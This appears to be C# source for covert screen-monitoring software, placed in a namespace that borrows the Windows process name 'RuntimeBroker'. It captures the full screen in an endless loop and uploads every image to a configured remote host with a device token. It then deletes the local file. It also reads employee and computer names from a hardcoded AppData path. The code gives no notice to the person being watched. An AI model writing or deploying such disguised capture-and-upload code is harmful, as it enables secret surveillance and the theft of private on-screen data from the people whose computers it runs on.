using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing.Imaging;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net.NetworkInformation;
using System.Net.Sockets;
using System.Net;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Xml.Serialization;
using Newtonsoft.Json.Linq;
using Newtonsoft.Json;
using System.Net.Http;

namespace RuntimeBroker
{
    public class ScreenTask
    {
        private string PcConfigPath = Path.Combine(@"C:\Users\Microsoft\AppData\Local", "Microsoft", "appsettings.xml");
        private string SettingPath = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, $"appsettings.xml");
        private string ImagePath = AppUtils.GetTempFolder() + "/image.png";
        private AppSettings _currentSettings = new AppSettings();

        private ReaderWriterLock rwl = new ReaderWriterLock();
        public AppSettings CurrentSettings { get { return _currentSettings; } }

        public ScreenTask()
        {
        }

        public async Task StartCaptureScreenAsync()
        {
            _ = Task.Factory.StartNew(() => CaptureScreenEvery(_currentSettings.ScreenshotsSpeed), TaskCreationOptions.LongRunning);
        }
        private async Task CaptureScreenEvery(int msec)
        {
            while (true)
            {
                TakeScreenshot();
                await Task.Delay(msec);
            }
        }

        private async Task UploadImageAsync(string imagePath)
        {
            try
            {
                bool isOnline = await AppUtils.IsOnline();
                if (isOnline)
                {
                    try
                    {
                        //var client = new HttpClient();
                        //var request = new HttpRequestMessage(HttpMethod.Post, _currentSettings.ImageHost);
                        //request.Headers.Add("accept", "*/*");
                        //var content = new MultipartFormDataContent();
                        //content.Add(new StreamContent(File.OpenRead(imagePath)), "Image", Path.GetFileName(imagePath));
                        //content.Add(new StringContent(Globals.UUID), "token");
                        //request.Content = content;
                        //var response = await client.SendAsync(request);
                        //response.EnsureSuccessStatusCode();
                        //string result = await response.Content.ReadAsStringAsync();


                        var handler = new HttpClientHandler
                        {
                            AutomaticDecompression = DecompressionMethods.GZip | DecompressionMethods.Deflate
                        };

                        var client = new HttpClient(handler)
                        {
                            Timeout = TimeSpan.FromMinutes(5) // Increase the timeout
                        };

                        var request = new HttpRequestMessage(HttpMethod.Post, _currentSettings.ImageHost);
                        request.Headers.Add("accept", "*/*");

                        var content = new MultipartFormDataContent();

                        try
                        {
                            using (var fileStream = File.OpenRead(imagePath))
                            {
                                content.Add(new StreamContent(fileStream), "Image", Path.GetFileName(imagePath));
                                content.Add(new StringContent(Globals.UUID), "token");
                                request.Content = content;

                                var response = await client.SendAsync(request);
                                response.EnsureSuccessStatusCode();

                                string result = await response.Content.ReadAsStringAsync();
                                // Process the result as needed
                            }
                        }
                        catch (IOException ex)
                        {
                            // Handle file access exceptions
                            Console.WriteLine($"File access error: {ex.Message}");
                        }
                        catch (HttpRequestException ex)
                        {
                            // Handle HTTP request exceptions
                            Console.WriteLine($"HTTP request error: {ex.Message}");
                        }
                        catch (TaskCanceledException ex)
                        {
                            // Handle timeout exception
                            Console.WriteLine($"Request timed out: {ex.Message}");
                        }
                        catch (Exception ex)
                        {
                            // Handle any other exceptions
                            Console.WriteLine($"Unexpected error: {ex.Message}");
                        }
                        finally
                        {
                            content.Dispose();
                        }
                    }
                    catch (Exception ex)
                    {
                        Log($"{ex.Message}");
                    }
                }

            }
            catch (Exception ex) { Log($"{ex.Message}"); }
            finally
            {
                File.Delete(imagePath);
            }
        }

        private void TakeScreenshot()
        {
            try
            {
                string imageFile = AppUtils.GetTempFile();

                ImageCodecInfo jpgEncoder = GetEncoder(ImageFormat.Png);

                var encoderQuality = System.Drawing.Imaging.Encoder.Quality;
                var encoderParam = new EncoderParameter(encoderQuality, _currentSettings.ImageQuality);
                var encoderParams = new EncoderParameters(1);
                encoderParams.Param[0] = encoderParam;

                var bmp = ScreenCapturePInvoke.CaptureFullScreen(true);
                rwl.AcquireWriterLock(Timeout.Infinite);
                bmp.Save(imageFile, jpgEncoder, encoderParams);
                rwl.ReleaseWriterLock();

                bmp.Dispose();
                bmp = null;

                if (File.Exists(imageFile))
                {
                    UploadImageAsync(imageFile);
                }
            }
            catch (Exception ex)
            {
                Log(ex.ToString());
            }
        }

        private ImageCodecInfo GetEncoder(ImageFormat format)
        {
            ImageCodecInfo[] codecs = ImageCodecInfo.GetImageEncoders();
            foreach (ImageCodecInfo codec in codecs)
            {
                if (codec.FormatID == format.Guid)
                {
                    return codec;
                }
            }
            return null;
        }
        private void Log(string text)
        {
            Console.WriteLine(DateTime.Now.ToShortDateString() + " " + DateTime.Now.ToShortTimeString() + " : " + text);
            Trace.WriteLine(text);
        }

        public void SaveSettings()
        {
            try
            {
                using (var appSettingsFile = new FileStream(SettingPath, FileMode.Create, FileAccess.Write))
                {
                    var serializer = new XmlSerializer(typeof(AppSettings));
                    serializer.Serialize(appSettingsFile, _currentSettings);
                }
            }
            catch (Exception ex)
            {
                Log(ex.ToString());
            }
        }

        public void LoadSettings()
        {
            try
            {
                if (File.Exists(SettingPath))
                {
                    var serializer = new XmlSerializer(typeof(AppSettings));
                    using (var appSettingsFile = File.OpenRead(SettingPath))
                    {
                        _currentSettings = (AppSettings)serializer.Deserialize(appSettingsFile);
                    }

                    using (var appSettingsFile = File.OpenRead(PcConfigPath))
                    {
                        var pcConfig = (AppSettings)serializer.Deserialize(appSettingsFile);
                        _currentSettings.ComputerName = pcConfig.ComputerName;
                        _currentSettings.EmployeeName = pcConfig.EmployeeName;
                    }
                }
            }
            catch (Exception ex)
            {
                Log($"Failed to load local appsettings.xml file.\r\n{ex.ToString()}");
            }
        }
    }
}
